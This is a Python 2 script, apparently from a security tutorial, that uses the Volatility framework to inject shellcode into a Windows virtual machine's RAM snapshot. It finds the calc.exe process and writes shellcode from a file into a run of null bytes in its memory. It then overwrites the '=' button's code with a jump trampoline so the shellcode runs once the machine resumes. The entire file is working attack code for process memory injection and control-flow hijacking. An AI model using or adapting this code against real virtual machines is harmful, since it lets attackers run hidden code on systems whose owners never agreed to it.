# 1. scan memory lokking for the 'calc.exe' process
# 2. hunt throught memory space for a place to inject the shellcode
# (find the physical offset in the RAM image that contains the function from 'codeconverge.py')
# 3. insert a small jump over the function address for the '=' button that jumps to shellcode and executes it.

import sys
import struct

equals_button = 0x01005D51

memory_file       = "<profileinfo>.vmem"
slack_space       = None
trampoline_offset = None


# read in our shellcode
sc_fd = open("cmeasure.bin", "rb")
sc    = sc_fd.read()
sc_fd.close()

sys.path.append("<Volatility Root Folder>")

import volatility.conf as conf
import volatility.registry as registry

registry.PluginImporter()
config = conf.ConfObject()

import volatility.commands as commands
import volatility.addrspace as addrspace

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

config.parse_options()
config.PROFILE  = "Win2003SP2x86"
config.LOCATION = "file://%s" % memory_file

import volatility.plugins.taskmods as taskmods

# 'PSList' responsible for walking through all of the running processes detected in the memory image
p = taskmods.PSList(config)

# iterate over each process
for process in p.calculate():
    # if discover a 'calc.exe' process,
    if str(process.ImageFileName) == "calc.exe":

        print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
        print "[*] Hunting for physical offsets...please wait."
        # obtain its full address space
        address_space = process.get_process_address_space()
        # all of the process's memory pages
        pages         = address_space.get_available_pages()

        # walk through the memory pages to find a chunk of memory the same size as shellcode
        # (should filled with zeros)
        for page in pages:
            # 'page' :
            # page[0] = the address of the page
            # page[1] = the size of the page in bytes
            physical = address_space.vtop(page[0])

            if physical is not None:

                if slack_space is None:
                    # open the RAM image
                    fd = open(memory_file, "r+")
                    # seek to the offset of where the page is
                    fd.seek(physical)
                    # read in the entire page of memory
                    buf = fd.read(page[1])

                    # attempt to find a chunk of NULL bytes enough to inject shellcode
                    try:
                        offset = buf.index("\x00" * len(sc))
                        slack_space  = page[0] + offset

                        print "[*] Found good shellcode location!"
                        print "[*] Virtual address: 0x%08x" % slack_space
                        print "[*] Physical address: 0x%08x" % (physical + offset)
                        print "[*] Injecting shellcode."
                        # where write the shellcode into the RAM image
                        fd.seek(physical + offset)
                        fd.write(sc)
                        fd.flush()

                        # create our trampoline
                        # create a small chunk of x86 opcodes
                        # the opcodes yield the following assembly
                        # mov ebx, ADDRESS_OF_SHELLCODE
                        # jmp ebx
                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"

                        if trampoline_offset is not None:
                            break

                    except:
                        pass

                    fd.close()

                # check for our target code location
                if page[0] <= equals_button and equals_button < ((page[0] + page[1])-7):

                    # calculate virtual offset
                    v_offset = equals_button - page[0]

                    # now calculate physical offset
                    trampoline_offset = physical + v_offset

                    print "[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)

                    if slack_space is not None:
                        break

        print "[*] Writing trampoline..."

        fd = open(memory_file, "r+")
        fd.seek(trampoline_offset)
        fd.write(tramp)
        fd.close()

        print "[HACK] Done injecting code."
